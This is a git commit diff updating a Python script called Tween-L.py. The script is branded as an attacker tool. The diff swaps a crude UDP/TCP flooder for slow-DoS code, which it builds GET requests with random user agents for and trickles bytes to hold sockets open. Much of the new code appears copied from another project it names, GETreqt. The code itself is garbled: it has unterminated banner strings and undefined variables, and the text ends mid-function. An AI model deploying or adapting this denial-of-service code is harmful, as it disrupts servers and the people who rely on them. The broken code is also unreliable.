ea1b204bcfdecaf3d62265489cdd7573ab7bae29
KunFay99 <kaffayukiffu@gmail.com>
2024-10-19 13:14:03 +0700

    Update Tween-L.py

--- Tween-L.py
+++ Tween-L.py
@@ -1,104 +1,119 @@
-# -*- coding: utf-8 -*-         
-import socket
-import threading
-import argparse
-import os
-import webbrowser
-import requests
-import sys
-import time
-os.system('clear')
+# -*- coding: utf-8 -*-        
 
-# Initialize parser
-parser = argparse.ArgumentParser()
- 
-# Adding optional argument
-parser.add_argument("-T", "--Target", help = "Enter target to flood")
-parser.add_argument("-p", "--Port", help = "Enter server port")
-parser.add_argument("-F", "--Fakeip", help = "Fake but valid ip")
-parser.add_argument("-M", "--Method", help = "Changes method")
-parser.add_argument("--T", "--Threads", help = "Adds threads")
+import socket; import time
+import threading; import random
+import argparse; import requests
+from termcolor import colored
+import colorama; import re
+import tqdm
 
-# Read arguments from command line
-args = parser.parse_args()
+colorama.init()
 
-target = (args.Target)
-Port =   (args.Port)
-Fakeip = (args.Fakeip)
-attack_num = 0
-threadcount = 25
-
-#How we update
-def update():
-    time.sleep(3)
-    webbrowser.open('https://github.com/KunFay99/Tween-L/')
-
-def checkver():
-    content = open("ver.txt",r) 
-    ver = content.read()
-
-def comparever():
-    latver = requests.get("https://https://github.com/KunFay99/Tween-L/latver.txt")
-    latver = latver.text
-    if letver != ver:
-        print("Updating now. We are sending you the updated url download")
-        time.sleep(3)
-        update()   
-
-#UDP packet
-def senditudp():
-    sockudp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    sockudp.connect((target, Port))
-#TCP packet
-def sendittcp():
-    socktcp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    socktcp.connect((target, Port))
-
-#Send packet
-def lzzz():
-    while True:
-        sendittcp()
-        print("tcp sent! :{}".format(args.Target))
-        time.sleep(0)
-        senditudp()
-        print("udp sent! :{}".format(args.Target))
-        time.sleep(0)
-
-#Method
-if args.Method =='udp-tcp':
-    lzzz()
-
-os.system("clear")
-print("""\033[1;31m  \033[92m 
-  
+currentVersionNumber = "v3.2.0"
+BANNER1 = colored('''
  |:::::::::::|                                            / ::
  ———— ::————/    ___   ____    ____   ___   ____          | ::
     | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
     | :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
     | ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |_::::| | :::::::
      \__   \__/\__   \_____/  \_____/  |___  \___          \________
-||###################################################################||
-||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
-||_________[[                                            ]]__________||
-||###################################################################||
+||###################################################################||''', 'blue')
+||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||''', 'red')
+||_________[[                                                        ||
+#####################################################################||''', 'blue')
+ 'blue')
+BANNER2 = colored('''    
+BANNER3 = colored('''    
+BANNER4 = colored('''    
 
-""")       
-print(" ")
-ip = input("\033[94m[*] \033[91mIP \033[91mTarget \033[97m>>> \033[93m ")
-port = input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m ")
-          
-for i in range(1000):
-    thread = threading.Thread(target=Fakeip)
-    thread.start()
 
-threads = []
-for i in range(threadcount):
-    th = threading.Thread(target=Attack)
-    th.dameon = True
-    threads.append(th)
+def printBanner():
+    print(BANNER1), print(BANNER2), print(BANNER3), print(BANNER4)
 
-for i in range(threadcount):
-    threads[i].start()
 
-for i in range(threadcount):
-    threads[i].join()
+def versionCheck():
+    global currentVersionNumber
+
+    print("\nChecking for GETreqt updates...", end="")
+
+    crawlVersionFile = requests.get(VERSION_CHECK_URL)
+    crawlVersionFile = str(crawlVersionFile.content)
+    crawlVersionFile = re.findall(r"([0-9]+)", crawlVersionFile)
+    latestVersionNumber = int(''.join(crawlVersionFile))
+
+    currentVersionNumber = re.findall(r"([0-9]+)", currentVersionNumber)
+    currentVersionNumber = int(''.join(currentVersionNumber))
+
+    if currentVersionNumber >= latestVersionNumber:
+        print(colored(" You are using the latest version!\n", "green"))
+    elif currentVersionNumber < latestVersionNumber:
+        print(colored(" You are using an older version of GETreqt.", "red"))
+        print(colored("\nGet the latest version at https://github.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack", "yellow"))
+        print(colored("Every new version comes with fixes, improvements, new features, etc..", "yellow"))
+        print(colored("Please do not open an Issue if you see this message and have not yet tried the latest version.\n", "yellow"))
+
+
+randomUserAgent = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
+]
+successfulSends = 0
+
+
+def constructRequest():
+    requestHeaders = ["GET / HTTP/2.0",
+                      f"Host: {target}",
+                      # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
+                      f"User-Agent: {random.choice(randomUserAgent)}\r\n",
+                      ]
+    if arguments.wait:
+        pass
+    elif arguments.end:
+        requestHeaders = requestHeaders[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
+    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
+    return(GETrequest)
+
+
+def deployRequests(target, port, length, currentSocket, GETrequest):
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # sock.settimeout(5)
+    try:
+        sock.connect((target, port))
+        sock.send(GETrequest)
+    except:
+        try:
+            sock.shutdown(socket.SHUT_RDWR)
+            sock.close()
+            deployRequests(target, port, length, currentSocket, GETrequest)
+        except:
+            deployRequests(target, port, length, currentSocket, GETrequest)
+
+    if arguments.end:
+        global successfulSends
+        for i in range(1, length + 1):
+            try:
+                sock.send(GETrequest)
+                successfulSends += 1
+                print(f"Successful send #{successfulSends} from socket {currentSocket}\n", end="")
+            except:
+                try:
+                    sock.shutdown(socket.SHUT_RDWR)
+                    sock.close()
+                    deployRequests(target, port, length, currentSocket, GETrequest)
+                except:
+                    deployRequests(target, port, length, currentSocket, GETrequest)
+            randomDelay = random.random() * 5
+            time.sleep(randomDelay)
+
+    else:
+        for i in range(1, length + 1):
+            try:
+                # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
+                sock.send(b" ")
+                print(f"Sent \"don't you die on me\" packet {i} / {length} via socket {currentSocket}\n", end="")
+    
